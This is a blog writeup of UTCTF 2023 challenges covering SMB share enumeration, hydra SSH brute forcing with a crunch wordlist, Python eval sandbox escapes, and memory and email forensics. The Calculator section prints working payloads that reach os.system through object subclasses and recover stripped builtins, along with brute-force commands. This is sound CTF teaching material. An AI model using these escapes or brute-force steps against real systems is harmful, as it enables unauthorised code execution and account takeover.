---
title: "CTF - UTCTF 2023"
categories: [ctf]
date: 2023-03-13
comments: true
image: /images/kashmir.png
favicon: /images/favicon.ico
description: CTF - UTCTF 2023
---

# UTCTF 2023

Welcome to another CTF writeup. This time I played UTCTF2023, a great CTF with interesting challenges, some easier than others. [RazviOverflow](https://razvioverflow.github.io/) joined me on this, participating as [ISwearGoogledIt](https://ctftime.org/team/109689). Let's dive into the challenges!  

<p align="center">
  <img src="/images/writeups/UTCTF2023/banner.png" width="80%"/>
</p>

---

Challenge index:

### Networking

- [A Network Problem - Part 1](#a-network-problem---part-1)
- [A Network Problem - Part 2](#a-network-problem---part-2)
- [A Network Problem - Part 3](#a-network-problem---part-3)


### Web

- [Calculator](#calculator)


### Forensic

- ["Easy" Volatility](#easy-volatility)
- [What Time is It?](#what-time-is-it)


<small><i><a href="https://github.com/kashmir54/md-toc">Table of contents generated with md-toc</a></i></small>

---

# Networking

## A Network Problem - Part 1
871
There are some interesting ports open on betta.utctf.live, particularly port 8080. By Robert Hill (@Rob H on discord)

betta.utctf.live:8080

```bash
nc betta.utctf.live 8080
Hi Wade! I am using socat to broadcat this message. Pretty nifty right? --jwalker utflag{meh-netcats-cooler}
```

We got the flag... Unexpected

``` utflag{meh-netcats-cooler} ```

## A Network Problem - Part 2
987
Update: smb port has been moved to 8445 from 445 on networking-misc-p2

betta.utctf.live has other interesting ports. Lets look at 445 this time. By Robert Hill (@Rob H on discord)

betta.utctf.live:8445

So the challenge was originally made on SMB port 445, so I will be using smbclient for this task. First, enumerate the shares:

```bash
smbclient -N -L //betta.utctf.live -p 8445

        Sharename       Type      Comment
        ---------       ----      -------
        WorkShares      Disk      Sharing of work files
        BackUps         Disk      File Backups.
        IPC$            IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

The BackUps and WorkShares might be accessible, let's check the in order. I used the anonymous user, since we don't have any other user and no bruteforce is allowed:

```bash
smbclient -N //betta.utctf.live/WorkShares -p 8445 -U anonymous

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar  8 20:45:05 2023
  ..                                  D        0  Wed Mar  8 20:45:05 2023
  shares                              D        0  Wed Mar  8 20:45:05 2023

                9974088 blocks of size 1024. 6140176 blocks available
smb: \> cd shares
smb: \shares\> ls
  .                                   D        0  Wed Mar  8 20:45:05 2023
  ..                                  D        0  Wed Mar  8 20:45:05 2023
  Advertising                         D        0  Wed Mar  8 20:45:05 2023
  OfficeFun                           D        0  Wed Mar  8 20:45:05 2023
  IT                                  D        0  Wed Mar  8 20:45:05 2023

                9974088 blocks of size 1024. 6140172 blocks available
smb: \shares\> cd Advertising\
smb: \shares\Advertising\> ls
  .                                   D        0  Wed Mar  8 20:45:05 2023
  ..                                  D        0  Wed Mar  8 20:45:05 2023
  Advertising Plan                    N       33  Wed Mar  8 20:45:05 2023
  Logos                               D        0  Wed Mar  8 20:45:05 2023

                9974088 blocks of size 1024. 6140172 blocks available

smb: \shares\> cd IT
smb: \shares\IT\> ls
  .                                   D        0  Wed Mar  8 20:45:05 2023
  ..                                  D        0  Wed Mar  8 20:45:05 2023
  Itstuff                             D        0  Wed Mar  8 20:45:05 2023

                9974088 blocks of size 1024. 6140052 blocks available
smb: \shares\IT\> cd Itstuff\
smb: \shares\IT\Itstuff\> ls
  .                                   D        0  Wed Mar  8 20:45:05 2023
  ..                                  D        0  Wed Mar  8 20:45:05 2023
  notetoIT                            N      380  Wed Mar  8 20:45:05 2023

                9974088 blocks of size 1024. 6140052 blocks available
smb: \shares\IT\Itstuff\> get notetoIT 
getting file \shares\IT\Itstuff\notetoIT of size 380 as notetoIT (1.0 KiloBytes/sec) (average 121.5 KiloBytes/sec)
```

On the notetoIT, we find the flag and a hint for the net challenge:

```
I don't understand the fasination with the magic phrase "abracadabra", but too many people are using them as passwords. Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood all basically have the same password. Can you please reach out to them and get them to change thier passwords or at least get them append a special character? 

-- Arty F.

utflag{out-of-c0ntrol-access}
```

``` utflag{out-of-c0ntrol-access} ```



## A Network Problem - Part 3
1000
We've gathered a lot of information at this point, let get access through ssh. (ignore port 22, use 8822)

(Use of brute force is permitted for this problem, but please set the wait time in hydra so you don't overwhelm the server)

By Rob H (@Rob H on discord)

betta.utctf.live:8822


Let's recall the previous note:

_I don't understand the fasination with the magic phrase "abracadabra", but too many people are using them as passwords. Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood all basically have the same password. Can you please reach out to them and get them to change thier passwords or at least get them append a special character?_

We can create a password list with the word _abracadabra_ and appending different special characters at the end. Also we have these users _Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood_ so the main strategy is to use the following sintax \<first_name_char\>\<surname\>:

Wordlist to use:

```bash
crunch 12 12 -t "abracadabra^" 
Crunch will now generate the following amount of data: 429 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 33
abracadabra!
abracadabra@
abracadabra#
abracadabra$
abracadabra%
abracadabra^
abracadabra&
abracadabra*
abracadabra(
abracadabra)
abracadabra-
abracadabra_
abracadabra+
abracadabra=
abracadabra~
abracadabra`
abracadabra[
abracadabra]
abracadabra{
abracadabra}
abracadabra|
abracadabra\
abracadabra:
abracadabra;
abracadabra"
abracadabra'
abracadabra<
abracadabra>
abracadabra,
abracadabra.
abracadabra?
abracadabra/
abracadabra
```

Usernames:

Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood

```
cball
wcoldwater
jwalker
hwood
```

So we might be on the right path with the username format guess, since the response of the SSH server is different for a valid user and wrong user:

```bash
kali@kali:~/Desktop/CTFs/UTCTF2023$ ssh casdasdasd@betta.utctf.live -p 8822
kex_exchange_identification: read: Connection reset by peer
Connection reset by 44.201.8.3 port 8822
                                                                                                                                                                                                           
kali@kali:~/Desktop/CTFs/UTCTF2023$ ssh wcoldwater@betta.utctf.live -p 8822
wcoldwater@betta.utctf.live's password:
```

Let's use hydra with the generated passwords and users:

```bash
hydra -s 8822 -L users.txt -P pass.txt betta.utctf.live -t 1 -c 2 -V ssh 
...
[ATTEMPT] target betta.utctf.live - login "wcoldwater" - pass "abracadabra!" - 34 of 132 [child 0] (0/0)
[ATTEMPT] target betta.utctf.live - login "wcoldwater" - pass "abracadabra@" - 35 of 132 [child 0] (0/0)
[ATTEMPT] target betta.utctf.live - login "wcoldwater" - pass "abracadabra#" - 36 of 132 [child 0] (0/0)
[ATTEMPT] target betta.utctf.live - login "wcoldwater" - pass "abracadabra$" - 37 of 132 [child 0] (0/0)
[8822][ssh] host: betta.utctf.live   login: wcoldwater   password: abracadabra$
[ATTEMPT] target betta.utctf.live - login "jwalker" - pass "abracadabra!" - 67 of 132 [child 0] (0/0)
[ATTEMPT] target betta.utctf.live - login "jwalker" - pass "abracadabra@" - 68 of 132 [child 0] (0/0)
[ATTEMPT] target betta.utctf.live - login "jwalker" - pass "abracadabra#" - 69 of 132 [child 0] (0/0)
[ATTEMPT] target betta.utctf.live - login "jwalker" - pass "abracadabra$" - 70 of 132 [child 0] (0/0)
[ATTEMPT] target betta.utctf.live - login "jwalker" - pass "abracadabra%" - 71 of 132 [child 0] (0/0)
...
```

And we found a valid combination!

<p align="center">
  <img src="/images/writeups/UTCTF2023/1_0_hydra.png" width="70%"/>
</p>

We can now log in and get the flag:

<p align="center">
  <img src="/images/writeups/UTCTF2023/1_1_flag.png" width="40%"/>
</p>

```bash
ssh wcoldwater@betta.utctf.live -p 8822
  wcoldwater@betta.utctf.live's password: 
  utctf{cust0m3d-lsts-rule!} well done!
  327f93bdc02d:~$ exit
  Connection to betta.utctf.live closed.
```

``` utctf{cust0m3d-lsts-rule!} ```

<br>
---
<br>

# Web

## Calculator
994
Who says guessing games shouldn't let you do math?

http://guppy.utctf.live:5957

By Alex (@Alex_ on discord)


We have a website were we input a payload and it gets executed:

<p align="center">
  <img src="/images/writeups/UTCTF2023/4_web.png" width="80%"/>
</p>

### Level 0

Is there a password variable or something? Let's see...

```python
# Level 0 input
7+7

# Output
Result: 14.  The correct answer was 2140703014.


# Level 0 input
{{7*7}}

# Output
Traceback (most recent call last):
  File "problem.py", line 6, in <module>
    result = eval(answer)
  File "<string>", line 1, in <module>
TypeError: unhashable type: 'set'


# Level 0 input
password

# Output
Result: PuXqj7n4WNZzStnWbtPv.  The correct answer was 748640991.

```

We enter the password and Level 1 gets unlocked.

### Level 1

This time I started to use some cursed payloads, looking for extra modules to get RCE.

```python
# Level 1 input
flag

# Output
Traceback (most recent call last):
  File "problem.py", line 7, in <module>
    result = eval(answer, {"open": None})
  File "<string>", line 1, in <module>
NameError: name 'flag' is not defined


# Level 1 input
().__class__.__base__.__subclasses__()

# Output
Result: "[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, 
<class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, 
<class 'NotImplementedType'>..." The correct answer was 2398385611.
```


We could see no POpen or subprocess, so looking for diffent methods, I found os.wrap_close, so let's use it to execute code:


```python
# Using os.wrap_close
# Level 1 input
().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("ls -la")

# Output
total 16
drwxrwx--T 2 server p1     4096 Mar 11 10:37 .
drwxrwxr-x 6 server server 4096 Mar 11 08:33 ..
-rw-rw-r-- 1 p1     p1       20 Mar 11 10:37 password.txt
-rw-r----- 1 server p1      326 Mar 11 08:33 problem.py
Result: 0.  The correct answer was 1854762157.


# Level 1 input
().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("cat password.txt")

# Output
Krdi9yQuY8mHoteZDCF5 Result: 0.  The correct answer was 3977916067.

```

Great we have the password, let's go to the next level.

Krdi9yQuY8mHoteZDCF5


### Level 2

```python
# Level 2 input
\{\{7*7\}\}

# Output
Traceback (most recent call last):
  File "problem.py", line 8, in <module>
    result = eval(answer, {})
  File "<string>", line 1, in <module>
TypeError: unhashable type: 'set'


# Level 2 input
().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("ls -la")

# Output
total 20
drwxrwx--T 2 server p2     4096 Mar 11 10:42 .
drwxrwxr-x 6 server server 4096 Mar 11 08:33 ..
-rw-r----- 1 server p2      352 Mar 11 08:33 problem.py


# Level 2 input
().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("cat problem.py")

# Output
import random, os
password = open("password.txt").read()
os.remove("password.txt") # No more reading the file!

solution = random.getrandbits(32)

answer = input()
result = eval(answer, {})

if result == solution:
    print(f"{result}, correct!  The password is '{password}'.")
else:
    print(f"Result: {result}.  The correct answer was {solution}.")

```

Checking for the current script, we can see that the file is removed, the only way to get the flag is:

- A dangling file descriptor to the file (since it is not closed, maybe we can reach it somehow. Very unlikely tbh).
- Access the solution variable.


We could access the solution variable fron the eval easily, but this second argument "{}" is setting the globals (and by default the locals) of the eval to None, therefore, the eval will be executing in a clean (in terms of variables) environment.

But what if we could load the current module and access to its variables? I reached that conclusion by looking to the different [builtin functions](https://docs.python.org/3/library/functions.html) that we can access. I saw getattr, and I started thinking about reaching other classes attributes. So the main issue is... How can I reach the current module? 

I tried to import the current file using \_\_import\_\_(problem.py) but it says "ModuleNotFoundError: No module named 'problem'", so I searched for other methods and checking for different methods, using \_\_main\_\_ I reached the current class. 


```python
# Level 2 input
getattr(__import__('problem.py'),'solution')

# Output
Traceback (most recent call last):
  File "problem.py", line 8, in <module>
    result = eval(answer, {})
  File "<string>", line 1, in <module>
ModuleNotFoundError: No module named 'problem'


# Level 2 input
getattr(__import__('__main__'),'solution')

# Output
3055728705, correct!  The password is 'E46Dnqb5enAMgGArbruu'.

```

### Level 3

Let's try the same again, start by enumerating the directory and get the problem.py file:

```python
# Level 3 input
().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("ls -la")

# Output
total 16
drwxrwx--T 2 server p3     4096 Mar 12 11:52 .
drwxrwxr-x 6 server server 4096 Mar 11 23:57 ..
-rw-r----- 1 server p3      435 Mar 11 23:57 problem.py
Result: 0.  The correct answer was 4128450524.


# Level 3 input
().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("cat problem.py")

# Output
import random, os
password = open("password.txt").read()
os.remove("password.txt") # No more reading the file!

solution = random.getrandbits(32)

answer = input()
# What, the last one was too easy?  Now try it without builtins!
result = eval(answer, {"__builtins__": {}})

if result == solution:
    print(f"{result}, correct!  The password is '{password}'.")
else:
    print(f"Result: {result}.  The correct answer was {solution}.")

```

Great, we have the code. The problem now is to reach the builtin functions in order to call **getattr** and **\_\_import\_\_** again and retrieve the random number. The most common way is to reach the class  **\<class 'warnings.catch_warnings'\>** since it has the builtins within. We can see it within the base subclasses, on index 137:

<p align="center">
  <img src="/images/writeups/UTCTF2023/4_1_catch.png" width="50%"/>
</p>


```python
# Level 3 input
().__class__.__base__.__subclasses__()[137]()._module.__builtins__['getattr']
Result: <built-in function getattr>.  The correct answer was 4195770746.
```

We reached the getattr class, now we have to do the same as the previous level, but using the builtin "import" in the same way that we loaded getattr this time, since it is undefined in the wiped context:

```python
getattr :     ().__class__.__base__.__subclasses__()[137]()._module.__builtins__['getattr']

__import__ :  ().__class__.__base__.__subclasses__()[137]()._module.__builtins__['__import__']

# Target call
getattr(__import__('__main__'),'solution')


# Level 3 input
().__class__.__base__.__subclasses__()[137]()._module.__builtins__['getattr'](().__class__.__base__.__subclasses__()[137]()._module.__builtins__['__import__']('__main__'),'solution')

# Output
2192900837, correct!  The password is '5F4p7aLgQ5Nfn5YM8s68'.

```

Now we input the password and get the flag:

Level 4 - The flag!

Congratulations! The flag is utflag{LGvb7PJXG5JDwhsEW7xp}.

<p align="center">
  <img src="/images/writeups/UTCTF2023/4_0_flag.png" width="70%"/>
</p>

``` utflag{LGvb7PJXG5JDwhsEW7xp} ```


---


# Forensic


## "Easy" Volatility
981
I've included the flag in as shell command. Can you retrieve it?

I recommend using the volatility3 software for this challenge.

Here is the memory dump: debian11.core.zst
This problem also comes with a free profile! debian11_5.10.0-21.json.zst
Both of these files are compressed using zstd.

This challenge's flag looks like a UUID.

First, install the profile provided:

```bash
cd /home/kali/Tools/volatility3/volatility3/symbols
mkdir linux
cp /home/kali/Desktop/CTFs/UTCTF2023/forensic/debian11_5.10.0-21.json .
xz -z debian11_5.10.0-21.json
```

Now we can keep going, let's get the bash commands with the builtin plugin and the flag:


```bash
python3 vol.py -f /home/kali/Desktop/CTFs/UTCTF2023/forensic/debian11.core linux.bash.Bash   
Volatility 3 Framework 2.4.1
Progress:  100.00               Stacking attempts finished                  
PID     Process CommandTime     Command

467     bash    2023-03-05 18:21:23.000000      # 08ffea76-b232-4768-a815-3cc1c467e813
```

``` 08ffea76-b232-4768-a815-3cc1c467e813 ```




## What Time is It?
993
Super Secure Company's database was recently breached. One of the employees self reported a potential phishing event that could be related. Unfortunately, our Linux email server does not report receiving any emails on March 2, 2023. Can you identify when this email was actually sent? The flag format is utflag{MM/DD/YYYY-HH:MM} in UTC time.

We have the following email:

```html
MIME-Version: 1.0
Date: Thu, 2 Mar 2023 03:12:42 +0000
Message-ID: <CAODBzaAPrwTP=oDe6fkOv1a7LApXzv1m+YrYG9RHZM7tbBJRbw@mail.gmail.com>
Subject: Critical Security Incident - Action Required ASAP!
From:  Security Division <admin-notifications@supersecurecompany.com>
To: Jim Browning <jim.browning@supersecurecompany.com>
Content-Type: multipart/alternative; boundary="00000000000093882205f60cdcdb"

--00000000000093882205f60cdcdb
Content-Type: text/plain; charset="UTF-8"

Jim,
  ...
```

The timestamp in the email is fake or wrong, but we can get the real timestamp when the email was sent from the boundary used to differenciate the different parts. I used the following script, just replace the string:


```python
from datetime import datetime

boundary = "00000000000093882205f60cdcdb"

ts = int(boundary[18:-2] + boundary[12:-10], 16) / 1000000
print(datetime.utcfromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S') + " UTC")

# 2023-03-04 06:06:24 UTC
```

And craft the flag:

``` utflag{03/04/2023-06:06} ```


That's it for this time, I hope you enjoyed it!
